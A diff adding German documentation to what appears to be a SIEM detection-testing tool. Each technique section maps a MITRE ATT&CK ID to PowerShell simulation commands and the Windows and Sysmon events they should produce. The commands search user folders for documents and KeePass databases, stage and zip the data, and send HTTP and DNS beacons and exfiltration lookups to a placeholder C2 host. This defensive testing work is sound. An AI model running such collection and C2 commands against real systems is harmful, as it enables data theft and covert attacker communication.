@@ -1900,6 +1900,188 @@ Remove-Item $tempDll -ErrorAction Ignore
 
 ---
 
+#### T1005 — Data from Local System
+
+| Eigenschaft | Wert |
+|---|---|
+| MITRE ATT&CK | [T1005](https://attack.mitre.org/techniques/T1005/) |
+| Taktik | Collection |
+| Exabeam-Regeln | ~15 |
+| Admin erforderlich | Nein |
+| Cleanup | Staging-Verzeichnis entfernt |
+
+**Was wird ausgeführt:**
+
+```powershell
+# Method 1: cmd.exe dir /s /b — Dateiauflistung in Documents (EID 4688)
+cmd /c "dir /s /b $env:USERPROFILE\Documents"
+
+# Method 2: PowerShell Get-ChildItem — Suche nach sensitiven Dateitypen (EID 4104)
+$sensitiveFiles = Get-ChildItem $env:USERPROFILE -Recurse -Include *.pdf,*.docx,*.xlsx,*.kdbx -ErrorAction SilentlyContinue | Select-Object -First 20
+
+# Method 3: Staging-Verzeichnis anlegen und synthetische Datei schreiben
+$stageDir = "$env:TEMP\lnj_stage"
+New-Item -ItemType Directory -Path $stageDir -Force | Out-Null
+[System.IO.File]::WriteAllText("$stageDir\sensitive_data.txt", "LOGNOJUTSU_SIMULATION...")
+
+# Method 4: robocopy Staging-Kopie — erzeugt Sysmon EID 1 für robocopy.exe
+robocopy "$env:USERPROFILE\Desktop" "$stageDir" /e /xl /xj /r:0 /w:0
+```
+
+**Erwartete SIEM-Events:**
+- `4688` — `cmd.exe` mit `dir /s /b` auf USERPROFILE-Pfad
+- `4104` — ScriptBlock: `Get-ChildItem` rekursive Suche nach `*.pdf`, `*.docx`, `*.xlsx`, `*.kdbx`
+- `Sysmon 1` — `robocopy.exe` Staging-Kopie in TEMP-Verzeichnis
+
+---
+
+#### T1560.001 — Archive Collected Data: Archive via Utility
+
+| Eigenschaft | Wert |
+|---|---|
+| MITRE ATT&CK | [T1560.001](https://attack.mitre.org/techniques/T1560/001/) |
+| Taktik | Collection |
+| Exabeam-Regeln | ~8 |
+| Admin erforderlich | Nein |
+| Cleanup | Archiv + Staging-Verzeichnis entfernt |
+
+**Was wird ausgeführt:**
+
+```powershell
+# Method 1: Staging-Verzeichnis mit synthetischen Dateien anlegen
+$stageDir = "$env:TEMP\lnj_stage"
+New-Item -ItemType Directory -Path $stageDir -Force | Out-Null
+
+# Method 2: Compress-Archive — PowerShell-Archivierung (EID 4104 + Sysmon EID 11 FileCreate)
+$archivePath = "$env:TEMP\lnj_archive.zip"
+Compress-Archive -Path "$stageDir\*" -DestinationPath $archivePath -Force
+
+# Method 3: compact.exe NTFS-Komprimierung als Alternative (EID 4688)
+compact.exe /C "$stageDir"
+
+# Method 4: Archiv-Verifizierung
+Get-Item $archivePath | Select-Object Name, Length, CreationTime
+```
+
+**Erwartete SIEM-Events:**
+- `4104` — ScriptBlock: `Compress-Archive` erstellt ZIP aus Staging-Dateien
+- `4688` — `compact.exe` NTFS-Komprimierung auf Staging-Verzeichnis
+- `Sysmon 11` — FileCreate: `.zip`-Archiv in TEMP erstellt
+
+---
+
+#### T1119 — Automated Collection
+
+| Eigenschaft | Wert |
+|---|---|
+| MITRE ATT&CK | [T1119](https://attack.mitre.org/techniques/T1119/) |
+| Taktik | Collection |
+| Exabeam-Regeln | ~10 |
+| Admin erforderlich | Nein |
+| Cleanup | Index-Datei entfernt |
+
+**Was wird ausgeführt:**
+
+```powershell
+# Method 1: ForEach-Object automatisierte Datei-Metadaten-Sammlung (EID 4104)
+$collected = @()
+Get-ChildItem $env:USERPROFILE -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+    $collected += [PSCustomObject]@{ Name = $_.Name; Size = $_.Length; LastWrite = $_.LastWriteTime; Path = $_.FullName }
+}
+
+# Method 2: Get-WmiObject Win32_LogicalDisk — automatisierte Laufwerksübersicht (EID 4104)
+Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, Size, FreeSpace, DriveType
+
+# Method 3: Sammlungsindex auf Disk schreiben — simulierter Angreifer-Index
+$indexPath = "$env:TEMP\lnj_collection_index.txt"
+$collected | Select-Object -First 100 | ForEach-Object {
+    "$($_.Name)`t$($_.Size)`t$($_.LastWrite)`t$($_.Path)"
+} | Out-File -FilePath $indexPath -Encoding UTF8
+```
+
+**Erwartete SIEM-Events:**
+- `4104` — ScriptBlock: `ForEach-Object`-Schleife für automatisierte Datei-Metadaten-Sammlung
+- `4104` — ScriptBlock: `Get-WmiObject Win32_LogicalDisk` automatisierte Laufwerksübersicht
+- `Sysmon 1` — PowerShell führt automatisiertes Sammlungsskript mit WMI-Abfragen aus
+
+---
+
+#### T1071.001 — Application Layer Protocol: Web Protocols (C2)
+
+| Eigenschaft | Wert |
+|---|---|
+| MITRE ATT&CK | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) |
+| Taktik | Command and Control |
+| Exabeam-Regeln | ~25 |
+| Admin erforderlich | Nein |
+| Cleanup | Keiner |
+
+**Was wird ausgeführt:**
+
+```powershell
+# Method 1: Invoke-WebRequest HTTP GET Beacon — .invalid TLD (Sysmon EID 3 + EID 22 + EID 4104)
+try {
+    Invoke-WebRequest -Uri "http://lognojutsu-c2.invalid/beacon" -Method GET -TimeoutSec 3 -ErrorAction Stop
+} catch {
+    Write-Host "Beacon fehlgeschlagen (erwartetes Verhalten — kein echter C2-Verkehr)"
+}
+
+# Method 2: Loopback-Fallback-Beacon — simuliert C2-Failover auf lokalen Handler (Sysmon EID 3)
+try {
+    Invoke-WebRequest -Uri "http://127.0.0.1:9999/c2/check-in" -TimeoutSec 2 -ErrorAction Stop
+} catch {
+    Write-Host "Loopback-Beacon fehlgeschlagen (kein Listener auf Port 9999)"
+}
+
+# Method 3: .NET WebClient API Beacon — alternative HTTP-C2-Methode (EID 4104)
+try {
+    (New-Object System.Net.WebClient).DownloadString("http://lognojutsu-c2.invalid/tasks")
+} catch {
+    Write-Host "WebClient-Beacon fehlgeschlagen (erwartetes Verhalten)"
+}
+```
+
+**Erwartete SIEM-Events:**
+- `Sysmon 3` — NetworkConnect: HTTP-Beacon-Versuch von PowerShell zu `lognojutsu-c2.invalid`
+- `4104` — ScriptBlock: `Invoke-WebRequest` C2-Beacon-Simulation
+- `Sysmon 22` — DNSEvent: DNS-Auflösungsversuch für `lognojutsu-c2.invalid` C2-Hostname
+
+---
+
+#### T1071.004 — Application Layer Protocol: DNS (C2)
+
+| Eigenschaft | Wert |
+|---|---|
+| MITRE ATT&CK | [T1071.004](https://attack.mitre.org/techniques/T1071/004/) |
+| Taktik | Command and Control |
+| Exabeam-Regeln | ~12 |
+| Admin erforderlich | Nein |
+| Cleanup | Keiner |
+
+**Was wird ausgeführt:**
+
+```powershell
+# Method 1: nslookup klassische DNS-Abfrage (EID 4688 + Sysmon EID 22)
+nslookup beacon.lognojutsu-c2.invalid
+
+# Method 2: DNS-Tunneling-Simulation — Schleife über 5 C2-Subdomains (mehrfach Sysmon EID 22)
+1..5 | ForEach-Object {
+    $subdomain = "c2-$_.lognojutsu-c2.invalid"
+    Resolve-DnsName $subdomain -ErrorAction SilentlyContinue | Out-Null
+    Start-Sleep -Milliseconds 500
+}
+
+# Method 3: DNS-Exfil-Simulation — codierte Subdomain (EID 4104 + Sysmon EID 22)
+Resolve-DnsName "exfil-data.lognojutsu-c2.invalid" -ErrorAction SilentlyContinue | Out-Null
+```
+
+**Erwartete SIEM-Events:**
+- `Sysmon 22` — DNSEvent: DNS-Abfrage an C2-Subdomain für DNS-Tunneling-Simulation
+- `4688` — `nslookup.exe` DNS-C2-Beacon-Abfrage für `lognojutsu-c2.invalid`
+- `4104` — ScriptBlock: `Resolve-DnsName` C2-DNS-Abfragen
+
+---
+
 ### UEBA-Szenarien (Exabeam)
 
 Diese Szenarien sind speziell für die Validierung von **Exabeam UEBA-Use-Cases** konzipiert. UEBA (User and Entity Behavior Analytics) erkennt keine einzelnen Events, sondern **Verhaltensmuster über Zeit**. Exabeam nutzt 750+ vortrainierte Verhaltensmodelle (Kategorial, Numerisch-Clustered, Zeitbasiert), die pro Benutzer, Peer-Group und Organisation kalibriert werden.
